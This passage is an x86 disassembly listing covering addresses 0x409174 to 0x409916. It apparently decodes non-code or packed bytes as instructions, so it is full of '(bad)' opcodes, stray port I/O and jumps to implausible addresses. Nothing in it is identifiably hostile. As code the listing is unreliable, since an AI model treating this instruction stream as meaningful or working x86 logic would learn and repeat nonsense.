  409174:	arpl   WORD PTR [eax-0x325ed35a],cx
  40917a:	mov    eax,ds:0x69d8ba42
  40917f:	cmp    dh,cl
  409181:	ret    
  409182:	xchg   ebx,eax
  409183:	mov    edi,0xc1228ab1
  409188:	and    DWORD PTR [eax+esi*1-0x4a61afd],esi
  40918f:	cmp    DWORD PTR [ebx+0x11],edi
  409192:	and    BYTE PTR [edx-0x74],ah
  409195:	outs   dx,BYTE PTR ds:[esi]
  409196:	out    dx,eax
  409197:	mov    bl,bh
  409199:	jmp    0x409169
  40919b:	mov    WORD PTR [eax-0xc],?
  40919e:	call   0x612c82b2
  4091a3:	shl    BYTE PTR [ebp+0x3cadc016],cl
  4091a9:	push   ds
  4091aa:	jae    0x409191
  4091ac:	xor    esi,edi
  4091ae:	sub    al,0x88
  4091b0:	xchg   ebp,eax
  4091b1:	outs   dx,DWORD PTR ds:[esi]
  4091b2:	jge    0x40914e
  4091b4:	dec    edx
  4091b5:	mov    ch,0x6
  4091b7:	popa   
  4091b8:	mov    dh,0x3d
  4091ba:	shr    DWORD PTR [esi+0x3640cbc0],1
  4091c0:	not    edx
  4091c2:	int    0xc
  4091c4:	test   DWORD PTR [edi-0x3fa86372],ecx
  4091ca:	in     eax,0xba
  4091cc:	call   0xe126c40d
  4091d1:	js     0x40918a
  4091d3:	rol    DWORD PTR [edi],cl
  4091d5:	or     DWORD PTR [ebx],edx
  4091d7:	aam    0x80
  4091d9:	mov    BYTE PTR [ebp+0x6ea35646],dl
  4091df:	xor    bl,bh
  4091e1:	xchg   ebp,eax
  4091e2:	gs cs dec esp
  4091e5:	popa   
  4091e6:	adc    BYTE PTR [eax+eiz*2+0x1d],bh
  4091ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091eb:	fsub   st,st(1)
  4091ed:	les    ebp,FWORD PTR [ecx-0x63]
  4091f0:	rcr    BYTE PTR [ebx*8+0x68daf8d5],1
  4091f7:	xchg   ecx,eax
  4091f8:	cmp    al,0x5
  4091fa:	push   edi
  4091fb:	dec    di
  4091fd:	jnp    0x409198
  4091ff:	push   ss
  409200:	int    0x9b
  409202:	xchg   ecx,eax
  409203:	scas   eax,DWORD PTR es:[edi]
  409204:	int3   
  409205:	inc    ebx
  409206:	pop    ebx
  409207:	xchg   esp,eax
  409208:	lock pop ds
  40920a:	mov    ebx,0x12a60b39
  40920f:	dec    ebp
  409210:	push   0xc0d8f36
  409215:	aaa    
  409216:	mov    ds:0x53c58fa0,al
  40921b:	int    0x49
  40921d:	adc    eax,0xf76e7f58
  409222:	add    eax,0x1a33befe
  409227:	es pop edi
  409229:	and    DWORD PTR [edi+0x5be4f549],edx
  40922f:	scas   al,BYTE PTR es:[edi]
  409230:	pop    esp
  409231:	aad    0xce
  409233:	nop
  409234:	add    eax,0x55afffbd
  409239:	pop    esi
  40923a:	dec    ebp
  40923b:	ret    0x54ed
  40923e:	mov    ds:0xfb7ae1aa,eax
  409243:	xor    al,0x66
  409245:	adc    eax,DWORD PTR [edx-0x349b34c9]
  40924b:	aaa    
  40924c:	push   esi
  40924d:	jmp    0x40924a
  40924f:	sub    BYTE PTR [eax-0x42],ah
  409252:	aam    0xa1
  409254:	lods   eax,DWORD PTR ds:[esi]
  409255:	in     eax,0x6f
  409257:	xor    al,0xeb
  409259:	xor    al,0x88
  40925b:	maxps  xmm3,XMMWORD PTR [ebx-0x59]
  40925f:	xlat   BYTE PTR ds:[ebx]
  409260:	out    dx,eax
  409261:	mov    al,0xc5
  409263:	sbb    DWORD PTR [edx-0x24ea167],0xd5dcfb78
  40926d:	aad    0xcd
  40926f:	popa   
  409270:	aaa    
  409271:	mov    dl,0x63
  409273:	(bad)  
  409274:	ins    DWORD PTR es:[edi],dx
  409275:	clc    
  409276:	jg     0x409245
  409278:	scas   al,BYTE PTR es:[edi]
  409279:	and    esi,esi
  40927b:	push   cs
  40927c:	ins    BYTE PTR es:[edi],dx
  40927d:	inc    esp
  40927e:	icebp  
  40927f:	loope  0x40921e
  409281:	mov    ecx,0x8e21350e
  409286:	and    DWORD PTR [edx],ebx
  409288:	jnp    0x40923f
  40928a:	out    0xb7,eax
  40928c:	mov    DWORD PTR ds:0x1ac99e8d,esi
  409292:	or     BYTE PTR [ebx-0x1bbdcf64],ch
  409298:	(bad)  
  409299:	aad    0xc6
  40929b:	xchg   ebx,eax
  40929c:	jb     0x409254
  40929e:	xchg   DWORD PTR [esi-0x497f6a51],edi
  4092a4:	in     al,dx
  4092a5:	aad    0x88
  4092a7:	mov    esp,DWORD PTR ds:0xfb074963
  4092ad:	rol    BYTE PTR [edi],cl
  4092af:	xchg   ebp,eax
  4092b0:	push   ebp
  4092b1:	push   0x27
  4092b3:	or     dl,BYTE PTR [ebp+eax*2-0x62f99f59]
  4092ba:	jp     0x4092e4
  4092bc:	push   ebp
  4092bd:	sbb    al,0xe6
  4092bf:	and    WORD PTR [ecx-0x50],0x2b
  4092c4:	or     BYTE PTR [ecx],dl
  4092c6:	cwde   
  4092c7:	xor    BYTE PTR [ebp+0x2068e4d9],al
  4092cd:	jp     0x4092c8
  4092cf:	outs   dx,BYTE PTR ds:[esi]
  4092d0:	out    dx,al
  4092d1:	fild   DWORD PTR [edi]
  4092d3:	fdiv   DWORD PTR [esi]
  4092d5:	or     al,0x54
  4092d7:	mov    ch,0x5
  4092d9:	or     DWORD PTR [ebx-0x2f],0xffffffa6
  4092dd:	ds xchg ebx,eax
  4092df:	ins    BYTE PTR es:[edi],dx
  4092e0:	dec    ebx
  4092e1:	mov    eax,0x4763777f
  4092e6:	ja     0x409313
  4092e8:	and    cl,BYTE PTR ds:[eax-0x7d]
  4092ec:	inc    esi
  4092ed:	mov    dl,0x92
  4092ef:	jno    0x409354
  4092f1:	push   ebp
  4092f2:	sbb    BYTE PTR [edi],bl
  4092f4:	jnp    0x409294
  4092f6:	dec    esi
  4092f7:	xor    eax,0x5ffaadb4
  4092fc:	sub    edx,0x25631007
  409302:	das    
  409303:	ret    0x165d
  409306:	push   eax
  409307:	imul   ebp,DWORD PTR [edi],0xa7e7118
  40930d:	or     al,0x5
  40930f:	xchg   edi,eax
  409310:	lods   al,BYTE PTR ds:[esi]
  409311:	ja     0x4092bc
  409313:	jmp    0x693e:0x596039ee
  40931a:	add    al,BYTE PTR [eax-0x638d6614]
  409320:	jl     0x4092b4
  409322:	pushf  
  409323:	idiv   BYTE PTR [edi]
  409325:	xchg   edi,eax
  409326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409327:	aas    
  409328:	retf   
  409329:	pop    ebx
  40932a:	jp     0x4092fb
  40932c:	xor    al,0xe4
  40932e:	nop
  40932f:	mov    al,ds:0x783e1cc7
  409334:	in     eax,0x98
  409336:	xchg   esp,eax
  409337:	add    esp,DWORD PTR [ecx-0x6e0402d2]
  40933d:	bound  ecx,QWORD PTR [ebx+0x52]
  409340:	or     al,0xe9
  409342:	adc    eax,0x3d01a212
  409347:	pop    ecx
  409348:	sti    
  409349:	jne    0x409348
  40934b:	mov    BYTE PTR [ecx],bh
  40934d:	cdq    
  40934e:	mov    ebx,DWORD PTR ds:0x6ecde99a
  409354:	repz jle 0x40937d
  409357:	(bad)  
  409358:	and    BYTE PTR ds:[edi],bh
  40935b:	jecxz  0x4092ff
  40935d:	pop    eax
  40935e:	xor    edi,0xd
  409361:	adc    al,0x72
  409363:	jo     0x4093e2
  409365:	xor    ebp,ebx
  409367:	adc    eax,0x8755a0a3
  40936c:	mov    dl,0x17
  40936e:	inc    ebp
  40936f:	jecxz  0x40938b
  409371:	pop    ebx
  409372:	and    DWORD PTR [esi+0x1467baff],0xf7fa8b74
  40937c:	push   ss
  40937d:	mov    edx,DWORD PTR [ecx]
  40937f:	ds ror esp,0x99
  409383:	lods   al,BYTE PTR ds:[esi]
  409384:	push   es
  409385:	inc    edx
  409386:	inc    ebp
  409387:	dec    edi
  409388:	inc    ecx
  409389:	and    al,0xf1
  40938b:	pop    ecx
  40938c:	mov    al,ds:0x2fa6ac77
  409391:	mov    WORD PTR [esi],es
  409393:	adc    al,0x99
  409395:	sahf   
  409396:	daa    
  409397:	out    dx,al
  409398:	jno    0x409388
  40939a:	or     al,0xa8
  40939c:	add    eax,0xf26b0a2c
  4093a1:	retf   
  4093a2:	dec    edx
  4093a3:	aam    0xd7
  4093a5:	mov    eax,ds:0xb01c17a8
  4093aa:	in     eax,0x6f
  4093ac:	das    
  4093ad:	imul   esi,edi,0x50dfa1c0
  4093b3:	mov    ebp,0xab5092b8
  4093b8:	addr16 mov ch,0x36
  4093bb:	out    0xf6,eax
  4093bd:	or     eax,0x55723b49
  4093c2:	aas    
  4093c3:	push   es
  4093c4:	shl    bl,0xbe
  4093c7:	ret    
  4093c8:	outs   dx,DWORD PTR ds:[esi]
  4093c9:	ret    0xffe8
  4093cc:	inc    eax
  4093cd:	je     0x40939c
  4093cf:	inc    ebp
  4093d0:	xor    dh,bl
  4093d2:	ds jmp 0x995f:0x328d3dd5
  4093da:	add    BYTE PTR [ecx],bh
  4093dc:	data16 or al,0x67
  4093df:	adc    al,0x17
  4093e1:	(bad)  
  4093e2:	rcl    BYTE PTR [ebp-0x27e5693f],cl
  4093e8:	stos   DWORD PTR es:[edi],eax
  4093e9:	leave  
  4093ea:	adc    eax,0x22073fba
  4093ef:	xchg   edx,eax
  4093f0:	mov    bl,0xb9
  4093f2:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093f4:	cwde   
  4093f5:	call   0xa21fc15d
  4093fa:	add    edx,esp
  4093fc:	jg     0x4093ef
  4093fe:	popa   
  4093ff:	jge    0x4093a3
  409401:	xchg   ebp,eax
  409402:	popa   
  409403:	push   cs
  409404:	fcomp  QWORD PTR [esi]
  409406:	hlt    
  409407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409408:	sahf   
  409409:	jbe    0x409444
  40940b:	pop    edx
  40940c:	pop    ss
  40940d:	or     ecx,esp
  40940f:	(bad)  
  409410:	fisub  DWORD PTR [esi+0x6a]
  409413:	xor    cl,bh
  409415:	inc    esi
  409416:	fiadd  WORD PTR [esi+0x231b2aae]
  40941c:	inc    ebx
  40941d:	and    al,0xb2
  40941f:	jmp    0x4093b7
  409421:	mov    esi,0xbfdd8527
  409426:	lahf   
  409427:	jns    0x4093db
  409429:	xchg   ecx,eax
  40942a:	or     BYTE PTR [ecx-0x7fcc16a5],bh
  409430:	retf   
  409431:	push   ebx
  409432:	inc    eax
  409433:	xor    DWORD PTR [ecx+0x2e],0xffffff9d
  409437:	mov    al,0x61
  409439:	mov    eax,0x814c5ad3
  40943e:	push   es
  40943f:	je     0x40942b
  409441:	pop    ebp
  409442:	gs ret 
  409444:	inc    edi
  409445:	aaa    
  409446:	pop    es
  409447:	sbb    al,0xd7
  409449:	jne    0x4093eb
  40944b:	ja     0x40944f
  40944d:	(bad)  
  40944e:	adc    bl,BYTE PTR fs:[esi-0x47]
  409452:	mov    dh,BYTE PTR [esp+ebx*1+0x19]
  409456:	sbb    al,0xc3
  409458:	imul   DWORD PTR ds:[edx-0x35a12342]
  40945f:	out    dx,eax
  409460:	push   esp
  409461:	push   esi
  409462:	scas   eax,DWORD PTR es:[edi]
  409463:	sbb    al,0xc0
  409466:	repnz iret 
  409468:	stc    
  409469:	fdivr  DWORD PTR [edx]
  40946b:	dec    edx
  40946c:	push   ss
  40946d:	xchg   edx,eax
  40946e:	and    DWORD PTR [esi-0x4b],0xffffffd7
  409472:	mov    dl,0xed
  409474:	mov    bl,0xb2
  409476:	push   edx
  409477:	mov    ds:0xf563586f,al
  40947c:	jp     0x4094e7
  40947e:	ror    DWORD PTR [ecx-0x43],cl
  409481:	(bad)  
  409482:	jo     0x40941a
  409484:	push   0xb
  409486:	sbb    BYTE PTR [edi],bh
  409488:	test   DWORD PTR [eax-0x73],0xd9aa4999
  40948f:	mov    bl,0xf3
  409491:	cld    
  409492:	in     eax,0x80
  409494:	out    dx,eax
  409495:	push   edx
  409496:	lods   eax,DWORD PTR ds:[esi]
  409497:	dec    edx
  409498:	inc    ebx
  409499:	adc    ah,BYTE PTR [ecx-0x72a21cd]
  40949f:	add    DWORD PTR [ecx+0x23],eax
  4094a2:	imul   ebx,DWORD PTR [edi+0x2],0x59
  4094a6:	mov    cl,0x33
  4094a8:	jp     0x4094ad
  4094aa:	jo     0x409510
  4094ac:	mov    bh,0xea
  4094ae:	(bad)  
  4094af:	push   edx
  4094b1:	inc    DWORD PTR [esi+0x185ccf8e]
  4094b7:	scas   eax,DWORD PTR es:[edi]
  4094b8:	or     eax,0x12731fb3
  4094bd:	xor    eax,0x9f3f021e
  4094c2:	lahf   
  4094c3:	sbb    esp,DWORD PTR [edx]
  4094c5:	cmp    ah,0xd0
  4094c8:	mov    ah,0x2a
  4094ca:	or     ch,dh
  4094cc:	mov    ds:0x9e2c1d83,eax
  4094d1:	mov    edi,0x8e150b0a
  4094d6:	cmp    esp,ecx
  4094d8:	mov    ds:0xc4a85216,al
  4094dd:	sahf   
  4094de:	repnz xor eax,0x838af80a
  4094e4:	jle    0x40952c
  4094e6:	sbb    al,0x95
  4094e8:	daa    
  4094e9:	je     0x4094aa
  4094eb:	pop    edi
  4094ec:	push   ds
  4094ed:	and    eax,DWORD PTR [ecx]
  4094ef:	xor    esi,ebp
  4094f1:	pusha  
  4094f2:	loopne 0x409519
  4094f4:	test   DWORD PTR [edx],edi
  4094f6:	xlat   BYTE PTR ds:[ebx]
  4094f7:	mov    ebx,0x876e96bc
  4094fc:	retf   
  4094fd:	push   0xfabd09d2
  409502:	ins    DWORD PTR es:[edi],dx
  409503:	add    dh,BYTE PTR [edi]
  409505:	xor    al,0xb7
  409507:	js     0x4094a8
  409509:	rol    DWORD PTR [eax],1
  40950b:	stos   BYTE PTR es:[edi],al
  40950c:	mov    dh,0xf5
  40950e:	mov    eax,0x3045fa
  409513:	sub    ch,dl
  409515:	jb     0x409560
  409517:	(bad)  
  409518:	cdq    
  409519:	mov    esp,0x9a477a31
  40951e:	ret    
  40951f:	mov    ecx,0x43797cc9
  409524:	sbb    bh,cl
  409526:	and    bh,BYTE PTR [edx]
  409528:	pop    esp
  409529:	hlt    
  40952a:	xchg   DWORD PTR [eax+0x5bce2f7e],esp
  409530:	jne    0x40953a
  409532:	add    cl,BYTE PTR [edx]
  409534:	aam    0xae
  409536:	repz pushf 
  409538:	jmp    0x40959e
  40953a:	stos   BYTE PTR es:[edi],al
  40953b:	jmp    0x4094d8
  40953d:	cs dec ebp
  40953f:	cdq    
  409540:	sahf   
  409541:	mov    ch,0xd5
  409543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409544:	mov    cl,0x74
  409546:	imul   ebp,DWORD PTR [edx+0x79],0xfffffff6
  40954a:	and    dl,BYTE PTR [eax+0x41cc7ddd]
  409550:	push   esp
  409551:	stos   BYTE PTR es:[edi],al
  409552:	dec    ebp
  409553:	add    DWORD PTR [ecx],ebx
  409555:	test   bh,dl
  409557:	std    
  409558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409559:	and    BYTE PTR [esi+edi*8-0x1ee25290],al
  409560:	push   es
  409561:	std    
  409562:	fsubr  QWORD PTR [edx+0x116b74b5]
  409568:	aaa    
  409569:	retf   0xd157
  40956c:	(bad)  
  40956d:	mov    ebx,0x55268b88
  409572:	aas    
  409573:	repnz fmul DWORD PTR [edx-0x303ed2d2]
  40957a:	xchg   DWORD PTR [ebp+eax*2+0x62],ecx
  40957e:	add    ch,BYTE PTR [eax+0x72e66110]
  409584:	pop    ebx
  409585:	sub    ecx,esi
  409587:	push   ebp
  409588:	cmp    ch,BYTE PTR [esi+0x3cf6454e]
  40958e:	ret    
  40958f:	daa    
  409590:	test   DWORD PTR [eax+0x47b496d4],ecx
  409596:	or     cl,BYTE PTR [eax-0x7afdb9b3]
  40959c:	add    ch,al
  40959e:	or     dh,bh
  4095a0:	cdq    
  4095a1:	pop    ecx
  4095a2:	aam    0x62
  4095a4:	adc    cl,dl
  4095a6:	and    eax,ecx
  4095a8:	ror    DWORD PTR [edi+0x36],1
  4095ab:	push   eax
  4095ac:	adc    al,0x91
  4095ae:	loop   0x4095e7
  4095b0:	shl    DWORD PTR [eax+0x67],1
  4095b3:	aam    0x2b
  4095b5:	sub    edx,0x73b36845
  4095bb:	pushf  
  4095bc:	pop    esp
  4095bd:	in     eax,0xac
  4095bf:	sbb    eax,0xb3c76e24
  4095c4:	jno    0x40959b
  4095c6:	inc    edi
  4095c7:	add    al,0xa5
  4095c9:	shl    BYTE PTR [esi-0x50],0x56
  4095cd:	loop   0x4095df
  4095cf:	rol    BYTE PTR [ebx],0x31
  4095d2:	cwde   
  4095d3:	inc    esp
  4095d4:	loope  0x40964d
  4095d6:	xchg   edx,eax
  4095d7:	xchg   ebp,eax
  4095d8:	mov    al,ds:0x79d53d0e
  4095dd:	push   0xffffffb5
  4095df:	aad    0xc1
  4095e1:	mov    edx,DWORD PTR [ebp+0x78]
  4095e4:	jnp    0x4095bb
  4095e6:	pop    ebp
  4095e7:	xor    dl,BYTE PTR [edx-0x71]
  4095ea:	jns    0x40963c
  4095ec:	pop    ebx
  4095ed:	retf   
  4095ee:	cmp    DWORD PTR [ecx],edx
  4095f0:	je     0x409620
  4095f2:	push   cs
  4095f3:	and    DWORD PTR [ebx],esp
  4095f5:	fwait
  4095f6:	mov    dl,0x7b
  4095f8:	or     esp,eax
  4095fa:	repnz fs inc edi
  4095fd:	mov    bl,dh
  4095ff:	dec    eax
  409600:	jp     0x40959e
  409602:	pushf  
  409603:	cmc    
  409604:	fisttp QWORD PTR [edi-0x50a3a032]
  40960a:	mov    edx,0xee63126c
  40960f:	push   ss
  409610:	jecxz  0x409679
  409612:	cmp    BYTE PTR [esi],dl
  409614:	dec    esp
  409615:	mov    bh,0xeb
  409617:	adc    al,BYTE PTR [eax-0x7f]
  40961a:	repnz mov ds:0x6d68671e,eax
  409621:	xor    ebx,DWORD PTR [ebx]
  409623:	sbb    cl,BYTE PTR [ecx+eax*1]
  409626:	mov    eax,0x76bbeb86
  40962b:	push   esp
  40962c:	rol    BYTE PTR [ebx+0xd],1
  40962f:	mov    ebx,0x881b5a08
  409634:	mov    al,ds:0x23bd91c4
  409639:	in     eax,0xe2
  40963b:	ss cdq 
  40963d:	rol    BYTE PTR [eax-0x79a4139d],0xe7
  409644:	mov    dl,0x33
  409646:	clc    
  409647:	xlat   BYTE PTR ds:[ebx]
  409648:	xchg   esp,eax
  409649:	mov    edx,0x2f5dff44
  40964e:	scas   al,BYTE PTR es:[edi]
  40964f:	bound  esi,QWORD PTR [eax]
  409651:	xchg   edi,eax
  409652:	pop    eax
  409653:	sbb    BYTE PTR [ebp+0x34a021c9],bl
  409659:	pop    edi
  40965a:	out    dx,al
  40965b:	jnp    0x409656
  40965d:	pop    es
  40965e:	dec    esi
  40965f:	or     al,0xd
  409661:	rol    BYTE PTR cs:[esp+eiz*4],0xf4
  409666:	addr16 imul ecx,edx,0xffffffcb
  40966a:	dec    edx
  40966b:	pop    eax
  40966c:	dec    edx
  40966d:	rol    BYTE PTR [eax-0x57],1
  409670:	xor    al,0x21
  409672:	outs   dx,BYTE PTR ds:[esi]
  409673:	xor    eax,0xf6c44a26
  409678:	jle    0x4096ca
  40967a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40967b:	in     eax,dx
  40967c:	mov    bl,cl
  40967e:	stos   BYTE PTR es:[edi],al
  40967f:	in     al,0x1b
  409681:	ret    0x83c1
  409684:	jne    0x4096eb
  409686:	mul    ch
  409688:	neg    DWORD PTR [edi+0x53272b74]
  40968e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40968f:	or     ecx,ebp
  409691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409692:	add    al,0xd2
  409694:	cmp    al,0x6a
  409696:	(bad)  
  409697:	ds out dx,al
  409699:	inc    edi
  40969a:	dec    esi
  40969b:	add    ecx,DWORD PTR [edx+0x27e7f919]
  4096a1:	pop    edx
  4096a2:	aaa    
  4096a3:	fwait
  4096a4:	cdq    
  4096a5:	ror    DWORD PTR [edi],1
  4096a7:	mov    ds,WORD PTR [esi+eax*4-0x63]
  4096ab:	(bad)  
  4096ac:	retf   0xffd9
  4096af:	or     ebx,edx
  4096b1:	inc    edi
  4096b2:	jb     0x409698
  4096b4:	dec    eax
  4096b5:	dec    edi
  4096b6:	mov    ebp,0x8ed5fb91
  4096bb:	mov    dl,0x5e
  4096bd:	push   ss
  4096be:	push   esi
  4096bf:	push   esi
  4096c0:	retf   
  4096c1:	push   esi
  4096c2:	arpl   WORD PTR [edi-0x459d6cd2],bp
  4096c8:	cwde   
  4096c9:	stos   DWORD PTR es:[edi],eax
  4096ca:	pop    esp
  4096cb:	lahf   
  4096cc:	rcl    bl,0x10
  4096cf:	rep outs dx,BYTE PTR ds:[esi]
  4096d1:	addr16 dec ebp
  4096d3:	sub    eax,0x4bd61976
  4096d8:	std    
  4096d9:	sub    BYTE PTR [ebp+0x44],al
  4096dc:	cwde   
  4096dd:	(bad)  
  4096de:	icebp  
  4096df:	jle    0x409731
  4096e1:	dec    ebp
  4096e2:	jecxz  0x409691
  4096e4:	aaa    
  4096e5:	test   al,0xac
  4096e7:	add    eax,0xaf3c17a6
  4096ec:	pusha  
  4096ed:	pop    edx
  4096ee:	ret    0x6037
  4096f1:	out    dx,al
  4096f2:	jge    0x40970e
  4096f4:	lods   al,BYTE PTR ds:[esi]
  4096f5:	xchg   BYTE PTR [ebp-0x7ea303bd],bl
  4096fb:	inc    ecx
  4096fc:	jmp    0x40972f
  4096fe:	std    
  4096ff:	outs   dx,BYTE PTR ds:[esi]
  409700:	mov    ebp,0x2abf9035
  409705:	jae    0x4096fb
  409707:	mov    ebx,0x1f516ac0
  40970c:	mov    DWORD PTR ds:0x8721b3b8,esp
  409712:	mov    ds:0xfb87e296,al
  409717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409718:	pop    es
  409719:	push   ebx
  40971a:	es cs jl 0x4096cd
  40971e:	aaa    
  40971f:	dec    eax
  409720:	jne    0x40977c
  409722:	int3   
  409723:	sbb    esp,edx
  409725:	aaa    
  409726:	call   0x67cbada1
  40972b:	aas    
  40972c:	xor    DWORD PTR [ebx],ebx
  40972e:	dec    ecx
  40972f:	adc    ecx,ebp
  409731:	mov    bl,0xda
  409733:	fcomp  QWORD PTR [edi+0x5a]
  409736:	adc    BYTE PTR ds:0x776914aa,bl
  40973c:	add    ebp,DWORD PTR [ebx]
  40973e:	sub    BYTE PTR [edx],ch
  409740:	dec    edx
  409741:	bound  eax,QWORD PTR ds:0x962f8710
  409747:	inc    edx
  409748:	aam    0xdc
  40974a:	dec    esi
  40974b:	push   esp
  40974c:	icebp  
  40974d:	sub    DWORD PTR [ecx-0x402f9759],eax
  409753:	xchg   ecx,eax
  409754:	add    BYTE PTR [eax-0x69],bl
  409757:	xchg   esi,eax
  409758:	inc    edx
  409759:	repnz xchg ecx,eax
  40975b:	jp     0x40973e
  40975d:	rol    DWORD PTR [edi+0x525ddb5d],0xfb
  409764:	data16 mov ds:0xf88d76f8,al
  40976a:	or     eax,0x4ac5c1c0
  40976f:	test   eax,0xc329fbf9
  409774:	jg     0x4097f0
  409776:	pusha  
  409777:	popf   
  409778:	popa   
  409779:	push   cs
  40977a:	mov    ds:0x1826290e,eax
  40977f:	adc    edi,DWORD PTR [ecx]
  409781:	or     esp,DWORD PTR [eax-0x7ac36f5a]
  409787:	add    ebp,DWORD PTR [esi+0x5a]
  40978a:	test   BYTE PTR [eax],ch
  40978c:	mov    edi,DWORD PTR [eax]
  40978e:	(bad)  
  40978f:	jmp    0x4097a9
  409791:	sbb    BYTE PTR [esi+ebp*8],dl
  409794:	jp     0x40977e
  409796:	rcl    BYTE PTR [esi+edx*1-0xcc1cc37],0xd8
  40979e:	dec    ebp
  40979f:	push   eax
  4097a0:	cli    
  4097a1:	arpl   WORD PTR [ebp+esi*8-0x37ebdb7e],si
  4097a8:	inc    ebp
  4097a9:	pop    edi
  4097aa:	dec    eax
  4097ab:	in     al,0xf9
  4097ad:	pop    eax
  4097ae:	popf   
  4097af:	mov    ebx,0xf0cd325b
  4097b4:	xor    BYTE PTR [ebp+0x5d31d937],0xa3
  4097bb:	out    dx,al
  4097bc:	ficom  DWORD PTR [eax]
  4097be:	js     0x409751
  4097c0:	add    eax,0xcb15a677
  4097c5:	sub    al,0x7b
  4097c7:	mov    bh,0xb6
  4097c9:	ftst   
  4097cb:	inc    ecx
  4097cc:	arpl   WORD PTR gs:[edi-0x263c1419],dx
  4097d3:	pop    ecx
  4097d4:	push   ebp
  4097d5:	popf   
  4097d6:	repz pop ebp
  4097d8:	ret    
  4097d9:	cdq    
  4097da:	xor    BYTE PTR [esi+0x2e],dh
  4097dd:	xchg   edi,eax
  4097de:	or     BYTE PTR [ebp+0x7c0228e9],al
  4097e4:	mov    al,ds:0xfbde64a7
  4097e9:	jl     0x409830
  4097eb:	loope  0x409858
  4097ed:	jb     0x40980c
  4097ef:	sar    DWORD PTR [ebx-0x20],1
  4097f2:	not    BYTE PTR [ecx-0x4af1a046]
  4097f8:	retf   
  4097f9:	div    DWORD PTR [esi-0x203ad374]
  4097ff:	push   esi
  409800:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409801:	in     eax,0xfa
  409803:	mov    dh,0x72
  409805:	cld    
  409806:	push   eax
  409807:	arpl   dx,cx
  409809:	lock pushfw 
  40980c:	inc    esp
  40980d:	push   ebp
  40980e:	sti    
  40980f:	xchg   BYTE PTR [edi+0xe],dl
  409812:	test   DWORD PTR [edx-0x7c],edi
  409815:	jg     0x4097eb
  409817:	mov    ebp,0x7f986869
  40981c:	mov    bh,BYTE PTR [ecx]
  40981e:	ins    DWORD PTR es:[edi],dx
  40981f:	pop    esp
  409820:	in     al,dx
  409821:	sbb    BYTE PTR es:0xed870aad,dl
  409828:	cmp    al,0x47
  40982a:	mov    ah,0x8e
  40982c:	jp     0x409877
  40982e:	xchg   esp,eax
  40982f:	shr    BYTE PTR [eax-0x48],cl
  409832:	retf   0x1114
  409835:	hlt    
  409836:	clc    
  409837:	outs   dx,BYTE PTR ds:[esi]
  409838:	das    
  409839:	push   ds
  40983a:	inc    esi
  40983b:	cmp    ch,dl
  40983d:	xchg   edx,eax
  40983e:	mov    ?,esp
  409840:	or     ah,bh
  409842:	mov    edi,0x3c209706
  409847:	loop   0x409880
  409849:	jmp    0x40989b
  40984b:	xchg   ebx,eax
  40984c:	lahf   
  40984d:	jmp    0x3e55a290
  409852:	int3   
  409853:	add    DWORD PTR [esi-0x2c],eax
  409856:	pop    edi
  409857:	jmp    0xe10f9026
  40985c:	scas   al,BYTE PTR es:[edi]
  40985d:	mov    BYTE PTR [ebx+0x34],cl
  409860:	nop
  409861:	repz (bad) 
  409863:	fadd   QWORD PTR [eax+esi*8]
  409866:	call   0x50ef:0xdb9744ab
  40986d:	jnp    0x4098eb
  40986f:	lods   eax,DWORD PTR ds:[esi]
  409870:	cli    
  409871:	jb     0x4098ca
  409873:	inc    ebp
  409874:	or     ah,ch
  409876:	mov    eax,ds:0x287a6a2f
  40987b:	mov    al,ds:0xfed5f543
  409880:	js     0x4098e8
  409882:	ja     0x409862
  409884:	mov    ah,BYTE PTR [ebx+0x2e]
  409887:	das    
  409888:	loopne 0x409893
  40988a:	(bad)  
  40988b:	fwait
  40988c:	aam    0x20
  40988e:	push   esp
  40988f:	sbb    bl,bl
  409891:	lock rcl DWORD PTR [ebx+ebp*2+0x3ad638b6],1
  409899:	xor    edx,ecx
  40989b:	dec    edx
  40989c:	dec    ebx
  40989d:	rcr    bl,0x3a
  4098a0:	mov    esi,0xdc0653c
  4098a5:	rcl    DWORD PTR [esi-0x578df19b],1
  4098ab:	jg     0x40984d
  4098ad:	pop    esi
  4098ae:	(bad)  
  4098af:	sbb    bh,bl
  4098b1:	sahf   
  4098b2:	inc    ebp
  4098b3:	mov    ds:0x544e7da,al
  4098b8:	xchg   edx,eax
  4098b9:	pusha  
  4098ba:	pop    ds
  4098bb:	mov    al,ds:0x2d8e0990
  4098c0:	bound  esi,QWORD PTR [edx-0x61]
  4098c3:	and    bh,ch
  4098c5:	push   esi
  4098c6:	lods   eax,DWORD PTR ds:[esi]
  4098c7:	cmp    ebp,DWORD PTR [ebx-0x54]
  4098ca:	pop    esi
  4098cb:	xor    DWORD PTR [ebx+0x1f],0x29
  4098cf:	pmaxsw mm7,QWORD PTR gs:[edi]
  4098d3:	inc    ecx
  4098d4:	mov    dl,0x89
  4098d6:	pop    esi
  4098d7:	push   edi
  4098d8:	cmp    DWORD PTR [esi+0x48],0x205b1c97
  4098df:	outs   dx,BYTE PTR ds:[esi]
  4098e0:	in     al,dx
  4098e1:	push   esi
  4098e2:	pop    edx
  4098e3:	outs   dx,DWORD PTR ds:[esi]
  4098e4:	int    0x4b
  4098e6:	mov    edx,0xbfba936e
  4098eb:	std    
  4098ec:	xor    eax,0x34e0afbe
  4098f1:	out    0xbb,eax
  4098f3:	in     al,0xc4
  4098f5:	out    0xba,eax
  4098f7:	or     DWORD PTR [eax],esi
  4098f9:	jmp    0x409954
  4098fb:	add    eax,0x509918d4
  409900:	ja     0x409960
  409902:	fdiv   st(0),st
  409904:	xchg   ecx,eax
  409905:	in     al,0xa8
  409907:	xchg   edi,eax
  409908:	fild   WORD PTR [esi]
  40990a:	mov    ebp,DWORD PTR [edx]
  40990c:	inc    eax
  40990d:	fild   WORD PTR [edi]
  40990f:	pop    es
  409910:	fdivr  DWORD PTR [eax-0x35969e8b]
  409916:	mov    ds:0x186dcba7,al
